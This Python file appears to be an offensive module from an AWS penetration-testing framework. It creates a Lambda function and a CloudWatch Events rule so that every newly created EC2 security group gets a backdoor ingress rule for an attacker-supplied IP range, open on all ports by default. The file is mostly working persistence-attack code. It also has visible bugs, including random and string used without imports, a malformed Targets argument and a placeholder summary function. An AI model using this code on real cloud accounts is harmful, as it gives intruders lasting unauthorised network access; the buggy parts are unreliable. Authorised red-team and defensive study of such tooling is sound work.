#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
from copy import deepcopy
import subprocess


module_info = {
    'name': 'lambda__backdoor_new_sec_groups',

    'author': 'Spencer Gietzen of Rhino Security Labs based on the idea from https://github.com/dagrz/aws_pwn/blob/master/persistence/backdoor_created_security_groups_lambda/backdoor_created_security_groups_lambda.py',

    'category': 'PERSIST',

    'one_liner': 'Creates a Lambda function and CloudWatch Events rule to backdoor new security groups.',

    'description': 'This module creates a new Lambda function and an accompanying CloudWatch Events rule that will trigger upon a new EC2 security group being created in the account. The function will automatically add a backdoor rule to that security group with your supplied IP address as the source.',

    'services': ['Lambda', 'Events', 'EC2'],

    'prerequisite_modules': ['iam__enum_users_roles_policies_groups'],

    'external_dependencies': [],

    'arguments_to_autocomplete': ['--regions', '--ip-range', '--port-range', '--protocol'],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions to create the backdoor Lambda function in, in the format "us-east-1". Defaults to all session regions.')
parser.add_argument('--ip-range', required=True, help='The IP range to allow backdoor access to. This would most likely be your own IP address in the format: 127.0.0.1/32')
parser.add_argument('--port-range', required=False, default='1-65535', help='The port range to give yourself access to in the format: starting-ending (ex: 200-800). By default, all ports are allowed (1-65535).')
parser.add_argument('--protocol', required=False, default='tcp', help='The protocol for the IP range specified. Options are: TCP, UDP, ICMP, or ALL. The default is TCP. WARNING: When supplying ALL, AWS will automatically allow traffic on all ports, regardless of the range specified. More information is available here: https://boto3.readthedocs.io/en/latest/reference/services/ec2.html#EC2.Client.authorize_security_group_ingress')


def main(args, pacu_main):
    session = pacu_main.get_active_session()

    ######
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input
    get_regions = pacu_main.get_regions
    fetch_data = pacu_main.fetch_data
    ######

    data = {'functions_created': 0, 'rules_created': 0, 'successes': 0}

    if not args.regions:
        regions = get_regions('Lambda')
    else:
        regions = args.regions.split(',')

    from_port, to_port = args.port_range.split('-')

    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the EC2 AuthorizeSecurityGroupIngress permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
    if not target_role_arn:
        if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
            print('Pre-req module not run successfully. Exiting...')
            return False
        roles = deepcopy(session.IAM['Roles'])

        print('Found {} roles. Choose one below.'.format(len(roles)))
        for i in range(0, len(roles)):
            print('  [{}] {}'.format(i, roles[i]['RoleName']))
        choice = input('Choose an option: ')
        target_role_arn = roles[int(choice)]['Arn']

    # Import the Lambda function and modify the variables it needs
    with open('./modules/{}/lambda_function.py.bak'.format(module_info['name']), 'r') as f:
        code = f.read()

    code = code.replace('FROM_PORT', from_port).replace('TO_PORT', to_port).replace('IP_RANGE', args.ip_range).replace('IP_PROTOCOL', args.protocol)

    with open('./modules/{}/lambda_function.py'.format(module_info['name']), 'w+') as f:
        f.write(code)

     # Zip the Lambda function
    try:
        subprocess.run(['zip', './modules/{}/lambda_function.zip'.format(module_info['name']), './modules/{}/lambda_function.py'.format(module_info['name'])], shell=True)
    except Exception as error:
        print('Failed to zip the Lambda function locally: {}\n'.format(error))
        return data

    with open('./modules/{}/lambda_function.zip'.format(module_info['name']), 'rb') as f:
        zip_file_bytes = f.read()

    for region in regions:
        print('Starting region {}...'.format(region))
        client = pacu_main.get_boto3_client('lambda', region)

        try:
            function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(15))
            response = client.create_function(
                FunctionName=function_name,
                Runtime='python3.6',
                Role=target_role_arn,
                Handler='a',
                Code={
                    'ZipFile': zip_file_bytes
                }
            )
            lambda_arn = response['FunctionArn']
            print('  Created Lambda function: {}'.format(function_name))
            data['functions_created'] += 1

            client = pacu_main.get_boto3_client('events', region)

            response = client.put_rule(
                Name=function_name,
                EventPattern='{"source":["aws.ec2"],"detail-type":["AWS API Call via CloudTrail"],"detail":{"eventSource":["ec2.amazonaws.com"],"eventName":["CreateSecurityGroup"]}}',
                State='ENABLED'
            )
            print('  Created CloudWatch Events rule: {}'.format(response['RuleArn']))
            data['rules_created'] += 1

            response = client.put_targets(
                Rule=function_name,
                Targets={
                    'Id': 0,
                    'Arn': lambda_arn
                }
            )
            if response['FailedEntryCount'] > 0:
                print('Failed to add the Lambda function as a target to the CloudWatch rule. Failed entries:')
                print(response['FailedEntries'])
            else:
                print('  Added Lambda target to CloudWatch Events rule.')
                data['successes'] += 1

        except ClientError as error:
            code = error.response['Error']['Code']
            if code == 'AccessDeniedException':
                print('  FAILURE: MISSING NEEDED PERMISSIONS')
            else:
                print(code)



    return data


def summary(data, pacu_main):
    if 'some_relevant_key' in data.keys():
        return 'This module compromised {} instances in the SomeRelevantKey service.'.format(len(data['some_relevant_key']))
    else:
        return 'No instances of the SomeRelevantKey service were compromised.'
